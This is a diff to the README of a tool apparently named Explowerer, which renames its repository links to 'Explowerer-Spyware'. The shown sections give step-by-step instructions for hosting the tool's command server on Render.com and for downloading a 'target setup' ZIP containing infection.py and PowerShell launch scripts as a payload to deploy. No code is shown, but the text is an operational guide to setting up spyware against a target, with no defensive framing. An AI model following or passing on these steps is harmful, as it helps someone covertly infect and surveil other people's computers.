@@ -25,7 +25,7 @@ Note: This method uses Render.com to host the web server for this tool.
 * Click `New` in the top-right corner.
 * Select `Web Service`
 * Choose `Public Git Repository`
-* Paste the following URL into the input field and click Connect `https://github.com/PowerPizza/Explowerer-Server`
+* Paste the following URL into the input field and click Connect `https://github.com/PowerPizza/Explowerer-Spyware`
 * Under `Name`, enter any name you prefer.  
 _Note: This name will be used as the subdomain prefix for your web server._
 * In the Language field, select `Python` or `Python 3`
@@ -44,7 +44,7 @@ So, make sure to copy the URL for later use.
 ## 2. Generating and Deploying the Payload
 * Install Python on your computer from the official website [python.org](https://www.python.org/downloads)
 
-* Downloading the ZIP file of target setup from https://raw.githubusercontent.com/PowerPizza/Explowerer-Server/master/backend/target_work/target_work.zip
+* Downloading the ZIP file of target setup from [Target Setup](https://raw.githubusercontent.com/PowerPizza/Explowerer-Spyware/master/backend/target_work/target_work.zip)
 
 * Extract the zip files into a folder - there will be `infection.py` `launch1.ps1` `launch2.ps1` etc... files in it.
 
